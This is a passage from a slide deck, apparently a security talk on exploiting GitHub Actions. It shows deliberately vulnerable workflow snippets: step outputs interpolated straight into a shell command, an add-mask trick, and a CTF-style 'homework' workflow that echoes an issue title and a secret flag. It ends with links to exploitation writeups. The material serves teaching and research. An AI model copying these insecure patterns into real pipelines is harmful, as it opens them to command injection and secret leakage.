+</span></span><span style=display:flex><span>      - <span style=color:#f92672>run</span>:  <span style=color:#ae81ff>echo &#34;${{ vars.CLEAR_FLAG }}&#34;</span> <span style=color:#75715e># Simulated loot</span>
+</span></span></code></pre></div></section><section><h2 id=skip-it-fun-1>Skip it fun</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>use</span>: <span style=color:#75715e>##[add-mask]true</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>impact</span>: <span style=color:#e6db74>&#34;true&#34;</span>, <span style=color:#ae81ff>is now a secret</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>result</span>: <span style=color:#ae81ff>GH will prevent you to put secret in output =)</span>
+</span></span></code></pre></div></section><section><h2 id=unused-like-your-pp->Unused like your PP ?</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>validate json input</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          if jq &#39;.&#39; data.json; then
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            echo &#34;error=false&#34; &gt;&gt; $GITHUB_OUTPUT
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          else
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            echo &#34;error=true&#34; &gt;&gt; $GITHUB_OUTPUT
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            echo &#34;message=Json input is not valid&#34; &gt;&gt; $GITHUB_OUTPUT
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          fi</span>          
+</span></span><span style=display:flex><span>  <span style=color:#f92672>error-handling</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        if [[ &#34;${{ needs.setup.outputs.error}}&#34; == &#34;true&#34; ]]; then
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          ./sendReport -m &#39;${{ needs.setup.outputs.message}}&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          exit 1; #put the step in red, and prevent next step to be executed
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        fi</span>        
+</span></span></code></pre></div></section><section><h2 id=homework-2025>Homework 2025</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>name</span>: <span style=color:#ae81ff>Homework - 2025</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>on</span>:
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>issues</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>test</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>runs-on</span>: <span style=color:#ae81ff>windows-latest</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>run</span>: <span style=color:#ae81ff>echo &#34;$env:TITLE&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>TITLE</span>: <span style=color:#ae81ff>${{ github.event.issue.title }}</span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>run</span>: <span style=color:#e6db74>&#34;echo Flag: ${{ secrets.FLAG }}&#34;</span>
+</span></span></code></pre></div></section><section><h1 id=reference>Reference</h1><ul><li><a href=https://www.synacktiv.com/publications/github-actions-exploitation-introduction>https://www.synacktiv.com/publications/github-actions-exploitation-introduction</a></li><li><a href=https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd>https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd</a></li><li><a href=https://b611.github.io/pipelines>https://b611.github.io/pipelines</a></li><li><a href=https://www.sstic.org/2024/presentation/action_man_vs_octocat_github_action_exploitation/>https://www.sstic.org/2024/presentation/action_man_vs_octocat_github_action_exploitation/</a></li><li><a href=https://github.com/Nebouh/tdf-ctf-cicd>https://github.com/Nebouh/tdf-ctf-cicd</a></li><li><a href=https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#steal-the-cache-token>https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#steal-the-cache-token</a></li><li><a href=https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/>https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/</a></li><li><a href=https://github.com/boostsecurityio/lotp/issues>https://github.com/boostsecurityio/lotp/issues</a></li><li><a href=https://github.blog/security/application-security/how-to-secure-your-github-actions-workflows-with-codeql/>https://github.blog/security/application-security/how-to-secure-your-github-actions-workflows-with-codeql/</a></li></ul></section><section><h1 id=follow-me>Follow me</h1><ul><li><a href=https://github.com/tr4l>https://github.com/tr4l</a></li><li><a href=https://steamcommunity.com/id/badassEngie/>https://steamcommunity.com/id/badassEngie/</a></li><li><a href=https://twitter.com/Tr4LSecurity>https://twitter.com/Tr4LSecurity</a>
+​- <a href=https://fr.linkedin.com/in/tral>https://fr.linkedin.com/in/tral</a></li></ul></section><section></section></div></div><script type=text/javascript src=/reveal-hugo/object-assign.js></script>
+<script src=/reveal-js/dist/reveal.js></script>
+<script type=text/javascript src=/reveal-js/plugin/markdown/markdown.js></script>
+<script type=text/javascript src=/reveal-js/plugin/highlight/highlight.js></script>
+<script type=text/javascript src=/reveal-js/plugin/zoom/zoom.js></script>
+<script type=text/javascript src=/reveal-js/plugin/notes/notes.js></script>
+<script type=text/javascript>function camelize(e){return e&&Object.keys(e).forEach(function(t){newK=t.replace(/(_\w)/g,function(e){return e[1].toUpperCase()}),newK!=t&&(e[newK]=e[t],delete e[t])}),e}var revealHugoDefaults={center:!0,controls:!0,history:!0,progress:!0,transition:"slide"},revealHugoSiteParams={custom_theme:"reveal-hugo/themes/robot-lung.css"},revealHugoPageParams={},revealHugoPlugins={plugins:[RevealMarkdown,RevealHighlight,RevealZoom,RevealNotes]},options=Object.assign({},camelize(revealHugoDefaults),camelize(revealHugoSiteParams),camelize(revealHugoPageParams),camelize(revealHugoPlugins));Reveal.initialize(options)</script></body></html>
